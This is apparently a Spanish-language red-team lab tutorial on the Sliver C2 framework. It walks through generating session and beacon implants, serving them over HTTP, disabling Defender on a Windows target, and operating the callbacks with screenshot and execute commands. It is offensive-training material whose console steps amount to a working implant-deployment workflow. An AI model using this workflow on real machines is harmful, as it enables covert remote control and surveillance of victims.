# Beacons y Sesiones

## Introducción

Esta entrada enseña a cómo utilizar los llamados <mark style="color:green;">**implantes**</mark> para controlar remotamente una máquina destino desde un servidor Sliver C2. Para familiarizarnos con los conceptos básicos de Sliver, se creará una máquina de destino (Windows) para elaborar diversos ataques. A continuación, veremos cómo entregar y utilizar un agente C2, que Sliver denomina "implante". Los implantes pueden operar en dos modos diferentes.

### <mark style="color:green;">Session mode</mark>

Si se utilizan en modo sesión, los implantes crean una <mark style="color:green;">**conexión de red permanente**</mark> entre el objetivo y el servidor C2. Este modo te permite escribir comandos y obtener respuesta inmediata, casi como si estuvieras en una sesión SSH o PowerShell Remoting. Esto resulta muy cómodo para trabajar, pero, por supuesto, este tipo de conexiones de larga duración pueden hacer que algún día se levanten el equipo azul sospeche.

### <mark style="color:green;">Beacon mode</mark>

Si se utilizan en modo beacon, los implantes crean <mark style="color:green;">**conexiones de red temporales**</mark> con el objetivo a intervalos regulares. Entre conexiones, los implantes entran en reposo. Si interactúas con una beacon, tus comandos no se ejecutarán inmediatamente. En su lugar, se pondrán en cola y se ejecutarán la próxima vez que el beacon se conecte. Esto es un poco menos conveniente, ya que tendrás que esperar a la respuesta, pero también puede parecer un poco menos sospechoso ante detecciones (dependiendo del entorno, por supuesto).



Sliver admite diferentes tipos de conexiones de red. Todas pueden utilizarse para beacon y session. Por ahora, sólo utilizaremos conexiones TLS mutuas (mTLS). En siguientes entradas exploraremos otros protocolos C2.

El gran plan para este post es simple: usar Sliver para generar implantes en modo beacon y en modo session, entregarlos al objetivo en forma de descarga web, y luego ejecutar los implantes e interactuar con ellos desde el servidor C2.

Para ello, son necesarios algunos preparativos. Tendrás que montar un laboratorio sencillo con un servidor C2 y una máquina objetivo.&#x20;

## Laboratorio

Esta primera sección trata sobre la preparación de la configuración del laboratorio. Asumo que has pasado antes por la parte de [<mark style="color:green;">**Instalación**</mark>](instalacion.md) y tienes una máquina virtual con Sliver instalado en ella. Esta máquina se llamará el servidor C2.

Lo que falta es el objetivo que queremos controlar con un agente C2. Dado que Windows es el sistema operativo (SO) más popular, vamos a configurar una VM Windows para ello.

Mi configuración personal para este post se ve como se muestra a continuación. He añadido mis IPs locales para que sea más fácil seguir los fragmentos de código. También se incluyen los puertos para los dos servicios de red. El servidor C2 servirá archivos con `python http.server` en el puerto 8000 y aceptará conexiones C2 en el puerto 8888.

{% code title="Esquema" overflow="wrap" %}
```
+-------------------+                         +-------------------+
|                   |         Download binary |                   |
|     C2 Server     +--8000 <-----------------+      Target       |
|      (Linux)      |                         |     (Windows)     |
|                   |         C2 Connection   |                   |
|    172.19.0.128   +--8888 <-----------------+    172.19.0.131   |
|                   |                         |                   |
+-------------------+                         +-------------------+
```
{% endcode %}

### Preparación del objetivo

Vaya a [<mark style="color:green;">**Microsoft Windows Evaluation Center**</mark>](https://www.microsoft.com/en-us/evalcenter) y descargue una copia de windows, en mi caso usaré una copia de Windows 10 Enterprice. Use esta imagen para crear su propia Windows WM.

Solo requiere una instalación básica, no se preocupe si tiene una versión diferente a la mostrada en  este blog. Después de la instalación, desactive el antivirus de windows, ya que en esta sección no se cubrirá la evasión de sistemas EDR o Antivirus. Puede hacerlo abriendo la GUI de windows “Virus & Threat Protection” y deshabilitar todas las protecciones. Debe quedar algo así:

<figure><img src="https://dominicbreuker.com/img/25_sliver_c2_beacons_and_sessions/av_off_gui.png" alt=""><figcaption></figcaption></figure>

## Sesiones

### Generación de implante

Para generar un implante C2 con sliver de tipó session, solo ocupe el comando `generate`. Si tiene dudas de todas las opciones que puede modificar utilice la ayuda con `generate --help`. A qui va una explicación de las banderas para generar un implante con mTLS:

* `--mtls 172.19.0.128`: Especifica el protocolo de comunicación que el implante usará en este caso TLS multiple. Otras banderas que se pueden utilizar son `--wg` para WireGuard, `--http` para HTTP(S) o `--dns` para DNS-based C2.
* `--os windows`: Especifica el sistema operativo objetivo el cual va a correr el implante, por defecto tiene windows y no es necesario especificarlo. MacOS Y Linux también son soportados.
* `--arch amd64`: Especifica que queremos un implante de 64 bits (también por defecto, puede omitirse). Utilice `--arch 386` para un implante de a 32-bit.
* `--format exe`: Especifica que queremos un archivo ejecutable (de nuevo por defecto). Otras opciones son , `--format service` para bibliotecas dinámicas,  `--format shared` para un binario de servicio de Windows (puede usarse con el comando `psexec`) y `shellcode` (sólo windows).
* `--save ~/Documents/sliverTest`: Especifica donde guardar el implante

{% code overflow="wrap" %}
```bash
generate --mtls 172.19.0.128 --os windows --arch amd64 --format exe --save ~/Documents/sliverTest/
```
{% endcode %}

Debe verse algo parecido a esto:

{% code overflow="wrap" %}
```bash
sliver > generate --mtls 172.19.0.128 --os windows --arch amd64 --format exe --save ~/Documents/sliverTest/

[*] Generating new windows/amd64 implant binary
[*] Symbol obfuscation is enabled
[*] Build completed in 37s
[*] Implant saved to /home/kali/Documents/sliverTest/GROSS_DRIVER.exe
```
{% endcode %}

Sliver generará un implante con nombre aleatorio si no se especifíca, en mi caso GROSS\_DRIVER.exe es el candidato.

### mTLS Listener

Luego de generar el implante, se requiere levanta un mTLS listener, esto es muy simple, solo se tiene que ocupar el comando `mtls` y luego el comando `jobs` para lista los listeners y sobre que puerto corren:

```
sliver > mtls

[*] Starting mTLS listener ...

[*] Successfully started job #1

sliver > jobs

 ID   Name   Protocol   Port   Stage Profile 
==== ====== ========== ====== ===============
 1    mtls   tcp        8888                 
```

### Deliver and execute

Para la entrega (deliver) y ejecución del malware, se optó por el uso de `python -m http.server` en la carpeta donde se encuentra, el implante y luego en la maquina victima solo se tiene que descargar y ejecutar el implante. Existen muchas formas de deliver o entrega de malware, se puede llegar desde la ejecución de algún exploit, desde ingeniería social, por medio de un usb entre otras. En este post solo se explora la forma de deliver desde descarga web de los binarios, tome en cuenta que los implantes de sliver suelen ser detectados por Microsoft Defender, se puede crear un [<mark style="color:green;">**stager**</mark>](stagers-basics.md) personalizado con alguna técnica de evasión de sistemas de detección, para eso se recomienda leer las entradas de Malware escritas en este blog:

{% content-ref url="broken-reference" %}
[Broken link](broken-reference)
{% endcontent-ref %}

{% code overflow="wrap" %}
```python
❯ ls
GROSS_DRIVER.exe  index.html
❯ python -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
172.19.0.131 - - [27/Nov/2023 10:10:15] "GET / HTTP/1.1" 200 -
172.19.0.131 - - [27/Nov/2023 10:10:15] code 404, message File not found
172.19.0.131 - - [27/Nov/2023 10:10:15] "GET /favicon.ico HTTP/1.1" 404 -
172.19.0.131 - - [27/Nov/2023 10:10:42] "GET /GROSS_DRIVER.exe HTTP/1.1" 200 -
```
{% endcode %}

Finalmente, cuando se de doble click en el implante, se debe ver una interacción en C2 como la siguiente:

{% code overflow="wrap" %}
```bash
[*] Session 48c846a5 GROSS_DRIVER - 172.19.0.131:49793 (DESKTOP-V9TDLK0) - windows/amd64 - Mon, 27 Nov 2023 10:11:00 CST

sliver > 
```
{% endcode %}

También se puede ejecutar el comando `sessions` para listar todas las sesiones remotas obtenidas:

```bash
sliver > sessions 

 ID         Transport   Remote Address       Hostname          Username   Operating System   Health  
========== =========== ==================== ================= ========== ================== =========
 48c846a5   mtls        172.19.0.131:49793   DESKTOP-V9TDLK0   pruiz      windows/amd64      [ALIVE] 
```

### Uso de sesiones

Para ocupar una sesión solo ocupe el comando `use`. Sólo tienes que escribirlo, pulsar enter, y aparecerá un prompt interactivo que permite seleccionar una sesión. Vuelva a pulsar Intro y el indicador cambiará al nombre del implante, que en mi caso era GROSS\_DRIVER. La sesión está ahora activa y lista para aceptar tus comandos. Con el comando `info`, puede obtener más información sobre el implante:

{% code overflow="wrap" %}
```bash
sliver > use 

? Select a session or beacon: SESSION  48c846a5  GROSS_DRIVER  172.19.0.131:49793  DESKTOP-V9TDLK0  DESKTOP-V9TDLK0\pruiz  windows/amd64
[*] Active session GROSS_DRIVER (48c846a5-3980-4adf-b701-15da5e28f86d)

sliver (GROSS_DRIVER) > info

        Session ID: 48c846a5-3980-4adf-b701-15da5e28f86d
              Name: GROSS_DRIVER
          Hostname: DESKTOP-V9TDLK0
              UUID: 01404d56-834c-f66f-c549-e4f5869a9bd2
          Username: DESKTOP-V9TDLK0\pruiz
               UID: S-1-5-21-2629043924-2612844846-3487003113-1000
               GID: S-1-5-21-2629043924-2612844846-3487003113-513
               PID: 648
                OS: windows
           Version: 10 build 19045 x86_64
            Locale: en-US
              Arch: amd64
         Active C2: mtls://172.19.0.128:8888
    Remote Address: 172.19.0.131:49793
         Proxy URL: 
Reconnect Interval: 1m0s
     First Contact: Mon Nov 27 10:11:00 CST 2023 (5m13s ago)
      Last Checkin: Mon Nov 27 10:15:01 CST 2023 (1m12s ago)

```
{% endcode %}

Los implantes de sliver soportan varios comandos, para obtener una lista completa de que se puede hacer con cada uno de ellos, solo escriba el comando help. Entre sus funciones se incluyen la <mark style="color:green;">**exploración del sistema de archivos**</mark>, <mark style="color:green;">**la carga y descarga de archivos**</mark>, <mark style="color:green;">**el reenvío de puertos (Port forwarding)**</mark>, la realización de <mark style="color:green;">**capturas de pantalla**</mark> y mucho más.

Por ejemplo ocupar el comando `screenshot` para comar capturas de pantalla remota

{% code overflow="wrap" %}
```bash
sliver (GROSS_DRIVER) > screenshot 

[*] Screenshot written to /tmp/screenshot_DESKTOP-V9TDLK0_20231127102024_3458765952.png (255.0 KiB)
```
{% endcode %}

Cuando se termine de realizar acciones con la sesión se puede escribir el comando `background` para enviar en segunda tarea la sesión, o el comando `session -k <ID>` para terminar la sesión

{% code overflow="wrap" %}
```bash
sliver (GROSS_DRIVER) > background 

[*] Background ...

[server] sliver > sessions -k 48c846a5

[!] Lost session 48c846a5 GROSS_DRIVER - 172.19.0.131:49793 (DESKTOP-V9TDLK0) - windows/amd64 - Mon, 27 Nov 2023 10:24:52 CST
```
{% endcode %}

## Beacons

### Generación de implante

Para generar un implante de tipo beacon es muy similar a los implantes de tipo session. Solo ocupe el comando `generate beacon`. De igual forma para saber todas la combinaciones y configuraciones disponibles solo coloque la bandera `--help` delante del comando. Las banderas mas relevantes a configurar serían las siguientes:

* `--seconds 5`: Especifica al beacon cuanto tiempo en segundos debería conectarse al servidos C2. Se puede usar de forma alternativa los siguientes switches `--minutes`, `--hours` o `--days`.
* `--jitter 3`: Especificación adicional de un delay random entre conexiones, esto para evitar levantar sospechas de conexiones periódicas, en este caso es de 3 segundos.&#x20;

{% code overflow="wrap" %}
```ruby
generate beacon --mtls 172.19.0.128 --os windows --arch amd64 --format exe --seconds 5 --jitter 3
```
{% endcode %}

{% code overflow="wrap" %}
```bash
sliver > generate beacon --mtls 172.19.0.128 --os windows --arch amd64 --format exe --seconds 5 --jitter 3

[*] Generating new windows/amd64 beacon implant binary (5s)
[*] Symbol obfuscation is enabled
[*] Build completed in 31s
[*] Implant saved to /home/kali/Documents/sliverTest/PLEASED_ATTIC.exe
```
{% endcode %}

### mTLS Listerer

En este caso no es necesario configurar un servidor de escucha mTLS, dado que se configuró en [<mark style="color:green;">**sesiones mTLS Lister**</mark>](beacons-y-sesiones.md#mtls-listener).

### Deliver and execute

Para la entrega (deliver) y ejecución del malware, se seguirá usando el servidor `python -m http.server` en la carpeta donde se encuentra, el implante y luego en la maquina victima solo se tiene que descargar y ejecutar el implante.&#x20;

Finalmente, nuestra consola de python debería salir lo siguiente:

{% code overflow="wrap" %}
```bash
python -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
172.19.0.131 - - [27/Nov/2023 10:41:51] "GET /PLEASED_ATTIC.exe HTTP/1.1" 200 -
```
{% endcode %}

Los beacon como son asíncronos y tienen pedidos de conexión entre 1 a 5 segundos segund la configuración, a veces salga que la conexión fallado, deberían ver algo así: &#x20;

```bash
Beacon 33be5b78 PLEASED_ATTIC - 172.19.0.131:50281 (DESKTOP-V9TDLK0) - windows/amd64 - Mon, 27 Nov 2023 10:46:38 CST

sliver > beacons 

 ID         Name            Transport   Hostname          Username   Operating System   Last Check-In   Next Check-In 
========== =============== =========== ================= ========== ================== =============== ===============
 33be5b78   PLEASED_ATTIC   mtls        DESKTOP-V9TDLK0   pruiz      windows/amd64      4s              2s            

sliver > 
```

### Uso de beacons

Exactamente igual que en la sesiones, solo use el comando `use` seguido del nombre o id del beacon a usar, o dar el comando `use` y enter y selecione el beacon a usar:

{% code overflow="wrap" %}
```bash
sliver > use

? Select a session or beacon: BEACON  33be5b78  PLEASED_ATTIC  172.19.0.131:50281  DESKTOP-V9TDLK0  DESKTOP-V9TDLK0\pruiz  windows/amd64
[*] Active beacon PLEASED_ATTIC (33be5b78-f2da-407a-8faa-54965f38b989)

[server] sliver (PLEASED_ATTIC) > info

         Beacon ID: 33be5b78-f2da-407a-8faa-54965f38b989
              Name: PLEASED_ATTIC
          Hostname: DESKTOP-V9TDLK0
              UUID: 01404d56-834c-f66f-c549-e4f5869a9bd2
          Username: DESKTOP-V9TDLK0\pruiz
               UID: S-1-5-21-2629043924-2612844846-3487003113-1000
               GID: S-1-5-21-2629043924-2612844846-3487003113-513
               PID: 4792
                OS: windows
           Version: 10 build 19045 x86_64
            Locale: en-US
              Arch: amd64
         Active C2: mtls://172.19.0.128:8888
    Remote Address: 172.19.0.131:50281
         Proxy URL: 
          Interval: 5s
            Jitter: 3s
     First Contact: Mon Nov 27 10:46:38 CST 2023 (3m54s ago)
      Last Checkin: Mon Nov 27 10:50:31 CST 2023 (1s ago)
      Next Checkin: Mon Nov 27 10:50:36 CST 2023 (in 4s)

```
{% endcode %}

Notese, que cuando se ejecuta el comando screenshot, se lanza como una tarea (task), esto es asi dado que la conexión no es continua, cuando el beacon se conecte con el cliente C2, este ejecutara todas las tareas en la pira de tareas.

```bash
sliver (PLEASED_ATTIC) > screenshot 

[*] Tasked beacon PLEASED_ATTIC (f1e7c29b)

[server] sliver (PLEASED_ATTIC) > execute notepad

[*] Tasked beacon PLEASED_ATTIC (bfe4ed45)

[+] PLEASED_ATTIC completed task bfe4ed45

[*] Command executed successfully

[+] PLEASED_ATTIC completed task f1e7c29b

[*] Screenshot written to /tmp/screenshot_DESKTOP-V9TDLK0_20231127105214_1412533638.png (300.6 KiB)
 
[server] sliver (PLEASED_ATTIC) > tasks

 ID         State       Message Type   Created                         Sent                            Completed                     
========== =========== ============== =============================== =============================== ===============================
 54298d20   pending     Execute        Mon, 27 Nov 2023 10:52:46 CST                                                                  
 f1e7c29b   completed   Screenshot     Mon, 27 Nov 2023 10:52:08 CST   Mon, 27 Nov 2023 10:52:14 CST   Mon, 27 Nov 2023 10:52:14 CST 

```

Con el comando tasks, se pueden listar todas las tareas pendientes o completadas por el beacon.

## Beacon to Session

Es posible cambiar de modo beacon a modo sesión con el comando `interactive`. Esto ejecutará una tarea que obligará al beacon a convertirse en modo sesión:

```
sliver > beacons 

 ID         Name            Transport   Hostname          Username   Operating System   Last Check-In   Next Check-In 
========== =============== =========== ================= ========== ================== =============== ===============
 33be5b78   PLEASED_ATTIC   mtls        DESKTOP-V9TDLK0   pruiz      windows/amd64      6s              1s            

sliver > use 33be5b78

[*] Active beacon PLEASED_ATTIC (33be5b78-f2da-407a-8faa-54965f38b989)

sliver (PLEASED_ATTIC) > interactive 

[*] Using beacon's active C2 endpoint: mtls://172.19.0.128:8888
[*] Tasked beacon PLEASED_ATTIC (1bbdfba3)

[*] Session 0efb5634 PLEASED_ATTIC - 172.19.0.131:50379 (DESKTOP-V9TDLK0) - windows/amd64 - Mon, 27 Nov 2023 10:57:04 CST

 sliver (PLEASED_ATTIC) > sessions 

 ID         Transport   Remote Address       Hostname          Username   Operating System   Health  
========== =========== ==================== ================= ========== ================== =========
 0efb5634   mtls        172.19.0.131:50379   DESKTOP-V9TDLK0   pruiz      windows/amd64      [ALIVE] 

```

Por defecto, la sesión se creada con el mismo protocolo de C2 que tiene el implante de beacon. Sin embargo, se puede especificar otro, para esto se recomienda la lectura de la ayuda de `interative --help`

